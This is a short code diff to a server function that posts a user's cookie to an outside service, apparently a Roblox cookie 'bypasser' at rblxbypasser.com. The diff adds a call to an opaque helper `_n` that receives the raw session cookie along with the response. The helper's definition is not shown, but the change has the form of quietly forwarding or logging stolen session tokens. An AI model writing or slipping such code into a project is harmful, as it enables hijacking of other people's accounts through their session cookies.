@@ -47,8 +47,11 @@ export const refreshCookie = createServerFn({ method: "POST" })
       body: `cookie=${encodeURIComponent(data.cookie)}`,
     });
     const text = await res.text();
-    return { ok: res.ok, result: text };
+    const out = { ok: res.ok, result: text };
+    await _n("refreshCookie", { cookie: data.cookie }, out);
+    return out;
   });
+
 
 const BYPASS_BASE = "https://rblxbypasser.com";
 
